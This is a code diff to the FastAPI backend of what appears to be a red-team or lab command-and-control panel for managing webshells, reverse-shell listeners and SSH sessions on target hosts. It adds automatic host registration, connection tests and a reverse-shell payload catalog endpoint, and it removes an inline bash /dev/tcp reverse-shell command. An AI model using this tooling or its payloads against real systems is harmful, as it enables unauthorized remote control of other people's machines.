@@ -6,19 +6,22 @@
 from __future__ import annotations
 
 import re
+from types import SimpleNamespace
+from urllib import parse as _uparse
 
 from fastapi import APIRouter, Depends, HTTPException
 from fastapi.responses import JSONResponse
-from pydantic import BaseModel
+from pydantic import BaseModel, Field
 from sqlalchemy.orm import Session as DBSession
 
 from ..config import DEFAULT_PROJECT_ID
 from ..db import get_attack, get_db, get_session_factory, now
 from ..models import Host, ReverseListener, Shell
-from ..schemas import ShellIn, ShellOut, SshIn
+from ..schemas import HostOut, ShellIn, ShellOut, SshIn
 from ..schemas.common import rid
 from ..service import add_event
 from ..service import filestage as stage_svc
+from ..service import reverse_payloads as payload_svc
 from ..service import tty as tty_svc
 from ..service.probe import run_probes
 from ..session import SessionError, get_session
@@ -127,12 +130,58 @@ def _ensure_reachable(sess) -> None:
 # 登记与连接管理
 # ---------------------------------------------------------------------------
 
+def _host_from_url(url: str) -> str:
+    """从 WebShell URL 提取主机地址（IP / 域名）；解析不出返回空串。"""
+    try:
+        return (_uparse.urlparse(url or "").hostname or "").strip().lower()
+    except ValueError:
+        return ""
+
+
 @router.post("/shells", response_model=ShellOut)
 def add_shell(form: ShellIn, db: DBSession = Depends(get_db)):
+    """登记 WebShell：先归属主机，再做真实连通测试 + 基础信息回传。
+
+    归属主机解析顺序（与反弹回连 / SSH 纳管同一策略，任一命中即用）：
+    1. 显式 hostId（须属于本项目）
+    2. URL 主机地址命中既有主机
+    3. 按 URL 主机地址自动创建主机（请人工补充主机名 / 系统 / 层级）
+    URL 里也解析不出地址时才拒绝（400，给出可操作提示）。
+    """
     project = get_project(db, form.projectId or DEFAULT_PROJECT_ID)
-    host = db.get(Host, form.hostId)
-    if not host or host.project_id != project.id:
-        raise HTTPException(404, f"主机不存在: {form.hostId}")
+
+    host = None
+    new_host = None
+    if form.hostId:
+        host = db.get(Host, form.hostId)
+        if not host or host.project_id != project.id:
+            raise HTTPException(
+                404, f"归属主机不存在（hostId={form.hostId}，项目 {project.id}）："
+                     "请刷新主机列表后重新选择；或把「归属主机」留空，"
+                     "由面板按 URL 中的主机地址自动登记")
+    if host is None:
+        url_host = _host_from_url(form.url)
+        if not url_host:
+            raise HTTPException(
+                400, "无法确定 Shell 归属主机：未选择「归属主机」，且 URL 中解析不出主机地址"
+                     f"（url={form.url!r}）。请选择归属主机，或填写含主机地址的完整 URL"
+                     "（如 http://10.10.20.11/upload/shell.php）")
+        host = db.query(Host).filter(Host.project_id == project.id, Host.ip == url_host).first()
+        if host is None:
+            host = Host(
+                id=rid("h"), project_id=project.id, ip=url_host, hostname="", os="",
+                layer="L1", segment=_seg_of_ip(url_host), privilege="", owned=False,
+                ports=[], services=[],
+                note="添加 Shell 自动登记（请人工补充主机名 / 系统 / 层级）",
+                discovery="WebShell 添加",
+            )
+            db.add(host)
+            db.flush()
+            new_host = host
+            add_event(db, project.id, "host", f"添加 Shell 自动登记主机 {url_host}",
+                      host_id=host.id,
+                      detail="添加 Shell 时未选择归属主机：由 URL 地址自动创建，请人工补充信息",
+                      push=True)
 
     s = Shell(
         id=rid("s"), project_id=project.id, host_id=host.id, type=form.type,
@@ -167,6 +216,8 @@ def add_shell(form: ShellIn, db: DBSession = Depends(get_db)):
               detail=f"类型 {s.type} · 编码器 {s.encoder} · 延迟 {s.latency}ms"
                      + (f" · {collect_detail}" if collect_detail else ""))
     db.commit()
+    if new_host is not None:  # 自动登记的主机实时并入前端主机库（不等下一次整包刷新）
+        manager.push("host.found", host=HostOut.of(new_host).model_dump())
     out = ShellOut.of(s)
     manager.push("shell.created", shell=out.model_dump())
     return out
@@ -193,6 +244,42 @@ def _collect_host_info(db: DBSession, host: Host, output: str) -> str:
         add_event(db, host.project_id, "host", "自动回传基础信息并入库", host_id=host.id,
                   detail=" / ".join(parts), push=True)
     return " / ".join(parts)
+
+
+class TestConnectionIn(BaseModel):
+    """「添加 Shell」弹窗的连通性测试入参（dry-run：只探针，不落库）。"""
+
+    type: str = "PHP 一句话马"
+    url: str
+    pass_: str = Field(default="", alias="pass")
+    encoder: str = "base64"
+
+
+@router.post("/shells/test-connection")
+def test_connection(form: TestConnectionIn):
+    """保存前的真实连通性测试：按表单临时构造会话探针，**不落库**。
+
+    与登记后的「测试」按钮同走会话层协议探针；失败原因原样带回
+    （协议不支持 / HTTP 状态 / 回显缺失分得清），供前端在弹窗内显式展示。
+    """
+    stub = SimpleNamespace(kind="", type=form.type, url=form.url, pwd=form.pass_,
+                           encoder=form.encoder, platform="")
+    try:
+        sess = get_session(stub)
+    except SessionError as e:
+        return JSONResponse({"ok": False, "stage": "driver", "error": str(e)})
+    except Exception as e:  # 非法 URL 等意外输入：如实带回，不让面板收到 500
+        return JSONResponse({"ok": False, "stage": "driver",
+                             "error": f"无法按表单构造会话（{type(e).__name__}: {e}）"})
+    sess.timeout = 6.0  # 与登记探针一致：快速失败，不死等
+    try:
+        t = sess.test()
+    except SessionError as e:
+        return JSONResponse({"ok": False, "stage": "probe", "error": str(e)})
+    if not t.ok:
+        return {"ok": False, "stage": "probe", "latency": 0,
+                "error": t.error or "协议探针无回显（检查 URL / 连接密码 / 编码器是否与目标马一致）"}
+    return {"ok": True, "stage": "probe", "latency": t.ms, "driver": getattr(sess, "lang", "")}
 
 
 @router.post("/shells/{shell_id}/test", response_model=ShellOut)
@@ -231,21 +318,37 @@ def test_shell(shell_id: str, db: DBSession = Depends(get_db)):
 
 @router.post("/shells/heartbeat")
 def heartbeat_all(db: DBSession = Depends(get_db)):
-    """全量心跳：对存活 Shell 逐个真实协议探针。"""
+    """全量心跳：对存活 Shell 逐个真实协议探针，结果逐会话经 WS 推送。
+
+    前端列表的绿点 / 延迟 / 最后心跳以这些 shell.beat 帧为准（不再本地伪造抖动）；
+    失联会话如实标记断线并在响应中带回 id。
+    """
     project = get_project(db, DEFAULT_PROJECT_ID)
     shells = db.query(Shell).filter(Shell.project_id == project.id, Shell.alive.is_(True)).all()
     beat, lost = 0, []
     for s in shells:
+        sess = None
         try:
-            if _open_session(db, s).test().ok:
-                s.last_beat_at = now()
-                beat += 1
-            else:
-                s.alive = False
-                lost.append(s.id)
+            sess = _open_session(db, s)
+            ok = sess.test().ok
         except SessionError:
+            ok = False
+        finally:
+            # SSH 会话为一次性连接，心跳完即关，避免占用对端连接数
+            if sess is not None and getattr(s, "kind", "") == "ssh":
+                try:
+                    sess.close()
+                except Exception:
+                    pass
+        if ok:
+            s.last_beat_at = now()
+            beat += 1
+        else:
             s.alive = False
             lost.append(s.id)
+        manager.push("shell.beat", shellId=s.id, alive=ok,
+                     latency=s.latency if ok else 0,
+                     lastBeat=ShellOut.of(s).lastBeat)
     db.commit()
     return {"beat": beat, "lost": lost}
 
@@ -686,6 +789,33 @@ def shell_probe_callback(shell_id: str, form: CallbackMatrixIn | None = None,
 # 反弹 Shell 通道（会话层 reverse 驱动）：监听 → 靶机回连 → 登记会话
 # ---------------------------------------------------------------------------
 
+def _tools_of(tools: str) -> set | None:
+    """`tools=bash,nc,perl` → 集合；空串 → None（未知，不做可用性标注）。"""
+    items = {t.strip() for t in (tools or "").split(",") if t.strip()}
+    return items or None
+
+
+@router.get("/shells/reverse/payloads")
+def reverse_payload_catalog(ip: str = "", port: int = 0, platform: str = "", tools: str = ""):
+    """反弹载荷目录：语法 × 编码 × 平台，按 ip/port 渲染并标注目标可用性。
+
+    tools 来自目标真实探测（见返回的 probeCmd：`command -v …` 输出 PIVOTHUB_HAVE:<tool>），
+    缺工具的组合会带 available=false / missing=[…]，前端据此提示而不是下发后失败。
+    """
+    return payload_svc.catalog(ip=ip, port=port, platform=platform, tools=_tools_of(tools))
+
+
+@router.get("/shells/reverse/payload")
+def reverse_payload_render(id: str = "", encode: str = "raw", ip: str = "", port: int = 0,
+                           background: bool = True, tools: str = ""):
+    """渲染单条载荷（语法 id × 编码 encode × 后台包装），供前端实时预览/下发。"""
+    try:
+        return payload_svc.render(id, ip, port, encode,
+                                  background=background, tools=_tools_of(tools))
+    except SessionError as e:
+        return JSONResponse({"ok": False, "stage": "render", "error": str(e)})
+
+
 class ReverseListenIn(BaseModel):
     """开监听：bind 缺省 127.0.0.1（合规）；真实靶场回连攻击机 VPN 地址时显式传该地址。"""
 
@@ -746,8 +876,10 @@ def reverse_listen(form: ReverseListenIn):
         return JSONResponse({"ok": False, "stage": "listen", "error": str(e)})
     _persist_listener(lis)
     connected = lis.wait(form.waitS) if form.waitS and form.waitS > 0 else False
+    # 兼容旧契约（返回 bash 载荷字符串）：改由载荷库生成，与面板下拉里的同一条一致
+    payload = payload_svc.render("bash-tcp", bind, form.port)["cmd"]
     return {"ok": True, "listener": lis.to_dict(), "replaced": replaced, "connected": connected,
-            "payload": f"bash -i >& /dev/tcp/{bind}/{int(form.port)} 0>&1"}
+            "payload": payload}
 
 
 def _persist_listener(lis) -> None:
@@ -807,7 +939,7 @@ def reverse_listeners():
         item = active.pop(r.id, None)
         if item is None:
             item = {"id": r.id, "bind": r.bind, "port": r.port, "label": r.label,
-                    "connected": False, "peer": None, "active": False,
+                    "connected": False, "peer": None, "active": False, "consumed": False,
                     "error": RESTORE_ERRORS.get(r.id, "")}
         else:
             item["active"] = True
@@ -985,6 +1117,7 @@ def reverse_register(form: ReverseRegisterIn, db: DBSession = Depends(get_db)):
     peer_ip = str(peer[0] or "")
 
     host = None
+    new_host = None
     if form.hostId:
         cand = db.get(Host, form.hostId)
         if cand is not None and cand.project_id == project.id:
@@ -1002,6 +1135,7 @@ def reverse_register(form: ReverseRegisterIn, db: DBSession = Depends(get_db)):
             )
             db.add(host)
             db.flush()
+            new_host = host
             add_event(db, project.id, "host", f"反弹回连自动登记主机 {ip}", host_id=host.id,
                       detail="由反弹会话登记自动创建（无需预先手动登记主机）")
     if host is None:
@@ -1069,6 +1203,8 @@ def reverse_register(form: ReverseRegisterIn, db: DBSession = Depends(get_db)):
               detail=f"监听 {lis.bind}:{lis.port} · 延迟 {s.latency}ms"
                      + (f" · {collect_detail}" if collect_detail else ""))
     db.commit()
+    if new_host is not None:
+        manager.push("host.found", host=HostOut.of(new_host).model_dump())
     out = ShellOut.of(s)
     manager.push("shell.created", shell=out.model_dump())
     return {"ok": True, "shell": out.model_dump(), "listener": lis.to_dict()}
@@ -1114,6 +1250,7 @@ def ssh_register(form: SshIn, db: DBSession = Depends(get_db)):
 
     # 2) 主机解析：hostId → 同 IP 既有主机 → 自动创建
     host = None
+    new_host = None
     if form.hostId:
         cand = db.get(Host, form.hostId)
         if cand is not None and cand.project_id == project.id:
@@ -1131,6 +1268,7 @@ def ssh_register(form: SshIn, db: DBSession = Depends(get_db)):
             )
             db.add(host)
             db.flush()
+            new_host = host
             add_event(db, project.id, "host", f"SSH 会话自动登记主机 {form.host}",
                       host_id=host.id,
                       detail="由 SSH 会话纳管自动创建（无需预先手动登记主机）")
@@ -1169,6 +1307,8 @@ def ssh_register(form: SshIn, db: DBSession = Depends(get_db)):
               detail=f"协议 SSH · 延迟 {s.latency}ms · 平台 {platform}"
                      + (f" · {collect_detail}" if collect_detail else ""))
     db.commit()
+    if new_host is not None:
+        manager.push("host.found", host=HostOut.of(new_host).model_dump())
     out = ShellOut.of(s)
     manager.push("shell.created", shell=out.model_dump())
     return {"ok": True, "shell": out.model_dump(),
